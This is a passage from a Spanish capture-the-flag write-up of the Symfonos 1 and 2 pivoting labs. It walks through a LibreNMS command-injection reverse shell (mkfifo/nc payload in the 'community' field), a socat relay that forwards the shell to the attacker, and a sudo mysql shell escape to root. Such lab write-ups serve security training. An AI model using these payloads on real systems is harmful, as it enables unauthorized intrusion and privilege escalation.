<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_payload_field_symfonos2.png" class="" title="Campo payload en el script.">

<p>Si buscamos por payload en el script, podemos apreciar que existe una función que se llama create_new_device a la que le pasa una url y en la petición, en el campo community le inyecta el payload.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_libre_nms_create_new_device_payload_injection_symfonos2.png" class="" title="Donde inyecta el payload.">

<p>Al final le añade a la url &#x2F;addhost&#x2F;</p>
<p>Para crear un nuevo dispositivo en la web seguimos el siguiente orden Devices &gt; Add Device y una vez aquí solo tenemos que tener cuidado de dos campos:</p>
<ul>
<li>community: Que es donde se va a realiza la inyección de la reverse shell.</li>
<li>Force add: en la función create_new_device en el script en python indica que está en ON(activado&#x2F;marcado)</li>
</ul>
<p>En la máquina Symfonos 2 nos pondremos en escucha por el puerto 4646:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4646</span><br></pre></td></tr></table></figure></div>

<p>Indicamos que la <strong>ip de la reverse shell es la de la máquina SYMFONOS2</strong>, porque vamos a probar que funciona, más adelante indicaremos que es la de SYMFONOS1.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.100.5 4646 &gt;/tmp/f) #</span></span><br></pre></td></tr></table></figure></div>
<img src="/2024/12/04/Symfonos%201%20y%202/executing_reverse_shell_hidden_web_service_symfonos2.png" class="" title="Creando el dispositivo en la web.">

<p>Pero aún no hemos ganado acceso, ¿porque?. Si seguimos mirando el script en python vemos que abajo hay otra función llamada request_exploit</p>
<img src="/2024/12/04/Symfonos%201%20y%202/python_script_def_request_exploit_symfonos2.png" class="" title="Función que llama al exploit.">

<p>En esta función podéis ver que utiliza el id “capture”, capture está en Devices &gt; All Devices &gt; Generic &gt; reverse_shell &gt; Settings(icono de engranaje) &gt; Capture</p>
<p>En la pestaña de SNMP si le das a run llama a &#x2F;ajax_output.php y está es la manera que han tenido de automatizarlo. Si tu le das a run debería llegarte la conexión.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/run_snmp_device_symfonos2.png" class="" title="Botón de ejecutar SNMP.">

<img src="/2024/12/04/Symfonos%201%20y%202/primer_acceso_a_cronus_exitoso_symfonos2.png" class="" title="Acceso a cronus.">

<h2 id="Uso-de-Socat-para-reverse-shell"><a href="#Uso-de-Socat-para-reverse-shell" class="headerlink" title="Uso de Socat para reverse shell"></a>Uso de Socat para reverse shell</h2><p>Socat establece <strong>conexiones bidireccionales</strong> entre dos puntos de comunicación, podemos usar esto a nuestro favor.</p>
<ol>
<li>La IP de la reverse shell es la de Symfonos 1.</li>
</ol>
<img src="/2024/12/04/Symfonos%201%20y%202/reverse_shell_add_device_symfonos1_symfonos2.png" class="" title="Envío de reverse shell a Symfonos 1.">

<ol start="2">
<li>Redirigimos el tráfico con socat(todo lo que entre por el puerto 4646 que se mande al puerto 4646 de la máquina atacante).</li>
</ol>
<p>Antes de esto debemos tener una conexión activa para poder realizar todo el proceso, vamos a establecer la conexión con Symfonos1, mediante el curl que hicimos al principio que nos enviaba una reverse shell a nuestro equipo atacante. Vamos a cambiarnos a root(recordar que podemos ejecutar bash -p).<br>Comprobamos que socat esta instalado(which socat) si no recuerda que puedes subirle un binario sin problema)</p>
<p>Redirigimos el tráfico:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:4646,fork TCP:192.168.1.160:4646</span><br></pre></td></tr></table></figure></div>

<p>Dejamos esto abierto para que no se cierre el túnel.</p>
<ol start="3">
<li>Nos ponemos en escucha desde la máquina atacante:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4646</span><br></pre></td></tr></table></figure></div></li>
<li>En la web nos vamos al dispositivo creado y ejecutamos el exploit(nos vamos a SNMP y le damos a run)</li>
</ol>
<img src="/2024/12/04/Symfonos%201%20y%202/conexion_establecida_cronus_maquina_atacante.png" class="" title="Obtenemos la reverse shell en nuestra máquina atacante.">

<p>GENIAL!. Ya hemos conseguido traernos la reverse shell donde está el usuario cronus a nuestro máquina atacante, a continuación se realizaría el <strong>tratamiento de la tty</strong> como hemos visto en los pasos anteriores.</p>
<p>Si intentas hacer un Remote Port Forwarding con Chisel no podrás porque Chisel no permite la bidireccionalidad, esto significa que no enviaría el tráfico a la máquina atacante y al intentar conectarte de esta al puerto te dirá que ya está ocupado.</p>
<h1 id="Root-Symfonos-2"><a href="#Root-Symfonos-2" class="headerlink" title="Root Symfonos 2"></a>Root Symfonos 2</h1><p>Si usamos el comando:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure></div>
<p>Podemos apreciar que el usuario cronus puede ejecutar como root mysql:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/cronus_sudo_l_mysql_symfonos2.png" class="" title="Permite ejecutar el comando mysql como root.">

<p>Si buscamos en <a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >gtfobins<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> por mysql podemos ver que puede usar sudo para escalar privilegios, si pinchamos en él, nos sale lo siguiente:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mysql -e <span class="string">&#x27;\! /bin/sh&#x27;</span></span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/acceso_ganado_root_symfonos2.png" class="" title="Nos convertimos en root.">

<h1 id="Referencias"><a href="#Referencias" class="headerlink" title="Referencias"></a>Referencias</h1><ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=L1jSoCcvRY4&t=6529s" >Pivoting desde cero #1 | S4vitar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>

		</div>

		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/ctf/">#ctf</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/eJPT/">#eJPT</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/medium/">#medium</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux/">#linux</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/pivoting/">#pivoting</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/eCPPTv2/">#eCPPTv2</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/eCPTXv2/">#eCPTXv2</a>&nbsp;
			</li>
			
		</ul>
		

		
  <div class="recommended-article px-2 sm:px-6 md:px-8">
   <div class="recommended-desktop">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>Artículos recomendados</span>
    </div>
    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/03/25/lab-ejptv2-xerosec/" title="Laboratorio preparatorio ejptv2 | Xerosec" rel="bookmark">
  <img src="cover-image.png" alt="Laboratorio preparatorio ejptv2 | Xerosec" class="!max-w-none">
  <span class="title">Laboratorio preparatorio ejptv2 | Xerosec</span>
</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
  <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
  <span class="title">Blue | WriteUp</span>
</a><a class="recommended-article-item" href="/2025/06/12/Tentacle/" title="🐙 Tentacle | WriteUp" rel="bookmark">
  <img src="https://sergiky.github.io/2025/06/11/Tentacle/cover-image.webp" alt="🐙 Tentacle | WriteUp" class="!max-w-none">
  <span class="title">🐙 Tentacle | WriteUp</span>
</a></div>
   </div>
   <div class="recommended-mobile">
   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>Artículos recomendados</span>
   </div>
   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/03/25/lab-ejptv2-xerosec/" title="Laboratorio preparatorio ejptv2 | Xerosec" rel="bookmark">
  <img src="cover-image.png" alt="Laboratorio preparatorio ejptv2 | Xerosec" class="!max-w-none">
  <span class="title">Laboratorio preparatorio ejptv2 | Xerosec</span>
</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
  <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
  <span class="title">Blue | WriteUp</span>
</a></div>
   </div>
  </div>

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/01/09/Blue/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Blue | WriteUp</span>
						<span class="post-nav-item">Publicaciones anteriores</span>
					</span>
				</a>
			</div>
			
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comentarios
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://comments-sergiky.vercel.app',
          lang: 'en-US',
          dark: 'body[class~="dark-mode"]',
          reaction: true,
          requiredMeta: ['nick', 'mail'],
          emoji: ['QQ'],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">En esta página</div>
		<div class="page-title">Symfonos 1 y 2 | S4vitar | Pivoting I</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Introduccion-al-Pivoting"><span class="nav-text">Introducción al Pivoting.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Configuracion-del-laboratorio"><span class="nav-text">Configuración del laboratorio</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconocimiento"><span class="nav-text">Reconocimiento</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preparacion-de-directorios"><span class="nav-text">Preparación de directorios.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escaneo-red-interna"><span class="nav-text">Escaneo red interna</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%C2%BFEquipo-operativo"><span class="nav-text">¿Equipo operativo?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escaneo-de-puertos"><span class="nav-text">Escaneo de puertos</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Servicios-y-versiones-de-los-puertos"><span class="nav-text">Servicios y versiones de los puertos</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Primera-exploracion-desde-el-navegador"><span class="nav-text">Primera exploración desde el navegador</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listar-recursos-compartidos-de-Samba"><span class="nav-text">Listar recursos compartidos de Samba</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Uso-de-smbmap-fallido"><span class="nav-text">Uso de smbmap(fallido)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Null-session-con-smbclient"><span class="nav-text">Null session con smbclient</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-de-usuario-mediante-SSH"><span class="nav-text">Enumeración de usuario mediante SSH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Acceso-al-usuario-helios-desde-samba"><span class="nav-text">Acceso al usuario helios desde samba</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Virtual-hosting"><span class="nav-text">Virtual hosting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-de-plugins-de-Wordpress"><span class="nav-text">Enumeración de plugins de Wordpress</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Explotacion"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI"><span class="nav-text">LFI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Script-en-bash-para-realizar-el-LFI-desde-consola"><span class="nav-text">Script en bash para realizar el LFI desde consola</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI-to-RCE-Log-poisoning"><span class="nav-text">LFI to RCE. Log poisoning.</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Intento-de-visualizacion-de-clave-privada-ssh-de-helios"><span class="nav-text">Intento de visualización de clave privada ssh de helios</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Listar-procesos-en-ejecuccion"><span class="nav-text">Listar procesos en ejecucción</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-ssh-mail-Log-poisoning"><span class="nav-text">Apache, ssh, mail Log poisoning</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Conectarse-con-netcat"><span class="nav-text">Conectarse con netcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tratamiento-de-la-TTY"><span class="nav-text">Tratamiento de la TTY</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escalada-de-privilegios"><span class="nav-text">Escalada de privilegios</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Path-Hijacking"><span class="nav-text">Path Hijacking</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Empezamos-el-pivoting"><span class="nav-text">Empezamos el pivoting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Host-discovery"><span class="nav-text">Host discovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-scanning"><span class="nav-text">Port scanning</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunel-proxy-con-Chisel"><span class="nav-text">Túnel proxy con Chisel.</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconocimiento-Symfonos2"><span class="nav-text">Reconocimiento Symfonos2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Escaneo-de-puertos-1"><span class="nav-text">Escaneo de puertos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploracion-desde-el-navegador"><span class="nav-text">Exploración desde el navegador</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-smb"><span class="nav-text">Enumeración smb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP"><span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#John-the-ripper-para-crackear-shadow"><span class="nav-text">John the ripper para crackear shadow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Entramos-mediante-ssh"><span class="nav-text">Entramos mediante ssh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Explotacion-servicio-web-oculto"><span class="nav-text">Explotación servicio web oculto.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Acceso-a-servicios-internos-mediante-ssh-tunneling"><span class="nav-text">Acceso a servicios internos mediante ssh tunneling.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-en-servicio-web-interno"><span class="nav-text">RCE en servicio web interno</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Uso-de-Socat-para-reverse-shell"><span class="nav-text">Uso de Socat para reverse shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root-Symfonos-2"><span class="nav-text">Root Symfonos 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referencias"><span class="nav-text">Referencias</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sergiky</a>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">IMPULSADO POR <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">TEMA&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
                
                

                <li class="right-bottom-tools page-aside-toggle ">
                        <i class="fa-regular fa-outdent"></i>
                </li>

                

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>

	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="fa-regular fa-arrow-up"></i>
		</li>
		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Buscar..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>








  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>








    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>